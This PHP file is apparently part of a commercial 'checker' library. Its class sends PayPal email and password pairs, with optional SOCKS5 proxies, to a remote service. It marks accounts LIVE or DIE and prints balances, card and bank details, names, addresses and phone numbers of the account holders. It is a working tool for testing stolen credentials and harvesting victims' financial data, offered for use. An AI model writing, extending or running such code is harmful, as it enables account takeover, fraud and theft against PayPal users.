<?php
/*
* Product   : Aloresal Library for PHP
* Author    : -
*             -
*             -
* Web       : aloresal.com
* Revision  : 1.0.0
*
*/

namespace Aloresal\Api;

use Aloresal\Aloresal;
use Aloresal\Helper;

class Paypal extends Aloresal
{

    public function __construct($apikey)
    {
        parent::__construct($apikey);
        $this->apikey = $apikey;
    }

    /*
     * Check if email is registered in paypal
     */
    public function isRegistered()
    {
        $params = '&email='.$this->email .
                  '&method='.$this->method .
                  ((isset($this->socks5)) ? '&socks5='.$this->socks5 : '');
        $result = Helper::pipe($this->protocol . '://'.$this->server.'/api/paypal/isregistered?api=' . $this->apikey . $params);
        $result = json_decode($result, true);

        if($this->returnType === 0)
        {
            $this->output = json_encode($result);
        }
        else if($this->returnType === 1)
        {
            $print = array();

            switch ($result['code']) {
                case 0:
                    $print['code'] = 0;
                    break;
                case 1:
                    $print['code'] = 400;
                    break;
                case 2:
                case 3:
                    $print['code'] = 2;
                    break;
                case 4:
                case 5:
                case 6:
                    $print['code'] = 3;
                    break;
                default:
                    $print['code'] = 4;
                    break;
            }

            $print['msg'] = ($result['code'] === 0 ?
                                        Helper::color('<b>LIVE</b>', '@Green') :
                                        ($result['code'] == 2 ?
                                            Helper::color('<b>DIE</b>', '@Red') :
                                            ($result['code'] == 3 ?
                                                Helper::color('<b>LIMITED</b>', '@Yellow') :
                                                ($result['code'] == 4 ?
                                                    Helper::color('<b>SOCKS DIE</b>', '@Yellow') :
                                                    ($result['code'] == 5 ?
                                                        Helper::color('<b>SOCKS DIE</b>', '@Red') :
                                                        ($result['code'] == 6 ?
                                                            Helper::color('<b>SOCKS DIE</b>', '@Red') :
                                                            '')))))).' | ';


            $print['msg'] .=
                            (empty($this->socks5) ? '' : Helper::color($this->socks5.' | ', '@Black')) .
                            (isset($this->email) == true ? Helper::color($this->email, '@Black').' | ' : '') .
                            (isset($this->password) == true && $this->password != '' ? Helper::color($this->password, '@Black').' | ' : '');

            if ($result['code'] === 0) {
                if (!empty($result['data']['country_name'])) {
                    $print['msg'] .= Helper::color($result['data']['country_name'], '@Maroon').' | ';
                }
            }

            if (!empty($result['msg'])) {
                $print['msg'] .= Helper::color('message: '.$result['msg'], '@Black').' | ';
            }

            if ($result['code'] === 0) {
                $print['msg'] .= Helper::color('[API: '.$result['data']['API'].'] '.'[Server: '.$result['account']['API_Server'].']', '@Gray');
            }

            $this->output = $print;

        }

    }

    /*
     * The main method for this class
     * Check the Uber account and grab its data
     */
    public function exec()
    {
        $params = '&email='.$this->email .
                  '&password='.$this->password .
                  '&token='.$this->token .
                  ((isset($this->socks5)) ? '&socks5='.$this->socks5 : '');
        $result = Helper::pipe($this->protocol . '://'.$this->server.'/api/paypal?api=' . $this->apikey . $params);
        $result = json_decode($result, true);

        if($this->returnType === 0)
        {
            $this->output = json_encode($result);
        }
        else if($this->returnType === 1)
        {
            $print = array();

            switch ($result['code']) {
                case 0:
                    $print['code'] = 0;
                    break;
                case 1:
                    $print['code'] = 400;
                    break;
                case 5:
                    $print['code'] = 2;
                    break;
                case 2:
                    $print['code'] = 3;
                    break;
                case 3:
                    $print['code'] = ($result['msg'] == '400 Bad Request' ? 2 : 4);
                    break;
                case 4:
                case 6:
                default:
                    $print['code'] = 4;
                    break;
            }

            $print['msg'] = ($result['code'] === 0 ?
                                        Helper::color('<b>LIVE</b>', '@Green') :
                                        ($result['code'] == 2 ?
                                            Helper::color('<b>SOCKS DIE</b>', '@Yellow') :
                                            ($result['code'] == 3 ?
                                                ($result['msg'] == '400 Bad Request' ? Helper::color('<b>DIE</b>', '@Red') : Helper::color('<b>FAILED</b>', '@Red')) :
                                                ($result['code'] == 4 ?
                                                    Helper::color('<b>ERROR</b>', '@Olive') :
                                                    ($result['code'] == 5 ?
                                                        Helper::color('<b>DIE</b>', '@Red') :
                                                        ($result['code'] == 6 ?
                                                            Helper::color('<b>Unk</b>', '@Blue') :
                                                            '')))))).' | ';


            $print['msg'] .=
                            (empty($this->socks5) ? '' : Helper::color($this->socks5.' | ', '@Black')) .
                            (isset($this->email) == true ? Helper::color($this->email, '@Black').' | ' : '') .
                            (isset($this->password) == true && $this->password != '' ? Helper::color($this->password, '@Black').' | ' : '');

            if ($result['code'] === 0) {

                $print['msg'] .=
                                (isset($result['data']['country']) == true ? Helper::color('country : '.$result['data']['country'], '@Black').' | ' : '').
                                (isset($result['data']['account_type']) == true ? Helper::color('type : '.$result['data']['account_type'], '@Black').' | ' : '').
                                (isset($result['data']['account_verified']) == true ? (Helper::color('verified : '. ($result['data']['account_verified'] == true ? 'true' : ($result['data']['account_verified'] === null ? 'unknown' : 'false' ) ), '@DarkGoldenRod')).' | ' : '').
                                (isset($result['data']['account_limited']) == true ? (Helper::color('limited : '. ($result['data']['account_limited'] == true ? 'true' : ($result['data']['account_limited'] === null ? 'unknown' : 'false' ) ), '@DarkGoldenRod')).' | ' : '').
                                (isset($result['data']['account_number']) == true ? Helper::color('account number : '.$result['data']['account_number'], '@Black').' | ' : '').
                                (isset($result['data']['balance']) == true ? Helper::color('balance : '.$result['data']['balance'], '@Black').' | ' : '').
                                (isset($result['data']['paypal_credit']) == true ? Helper::color('paypal credit : '.$result['data']['paypal_credit'], '@Black').' | ' : '');

                if($result['data']['account_type'] == 'BUSINESS') {
                    if ($result['data']['cards']) {
                        foreach ($result['data']['cards'] as $card) {
                            $print['msg'] .=
                                Helper::color('[cards] '.$card['cardType'], '@Tomato').' - '.
                                Helper::color('x'.$card['card_number_last_n'], '@Tomato').' - '.
                                Helper::color($card['expire_month'], '@Tomato').'/'.
                                Helper::color($card['expire_year'], '@Tomato').' - '.
                                Helper::color($card['authorization_status'], '@Tomato').' | ';
                        }
                    }
                } else {
                    if ($result['data']['cards']) {
                        foreach ($result['data']['cards'] as $card) {
                            $print['msg'] .=
                                Helper::color('[cards] '.$card['brand'], '@Tomato').' - '.
                                Helper::color('x'.$card['last_nchars_card_number'], '@Tomato').' - '.
                                Helper::color($card['expiration_date'], '@Tomato').' - '.
                                Helper::color($card['authorization']['status'], '@Tomato').' | ';
                        }
                    }
                    if ($result['data']['banks']) {
                        foreach ($result['data']['banks'] as $bank) {
                            $print['msg'] .=
                                Helper::color('[banks] '.$bank['nick_name'], '@Tomato').' - '.
                                Helper::color($bank['type'], '@Tomato').' - '.
                                Helper::color('x'.$bank['last_nchars'], '@Tomato').' - '.
                                Helper::color($bank['confirmation_details']['status'], '@Tomato').' | ';
                        }
                    }
                }

                $print['msg'] .=
                                (isset($result['data']['full_name']) == true ? Helper::color('full name : '.$result['data']['full_name'], '@Black').' | ' : '').
                                (isset($result['data']['address']) == true ? Helper::color('address : '.$result['data']['address'], '@Black').' | ' : '').
                                (isset($result['data']['phone']) == true ? Helper::color('phone : '.$result['data']['phone'], '@Black').' | ' : '').
                                (isset($result['data']['account_created']) == true ? Helper::color('join : '.$result['data']['account_created'], '@Black').' | ' : '');
            }

            if (!empty($result['msg'])) {
                $print['msg'] .= Helper::color('message: '.$result['msg'], '@Black').' | ';
            }

            if ($result['code'] === 0) {
                $print['msg'] .= Helper::color('[API: '.$result['data']['API'].'] '.'[Server: '.$result['account']['API_Server'].']', '@Gray');
            }

            $this->output = $print;

        }

    }

}
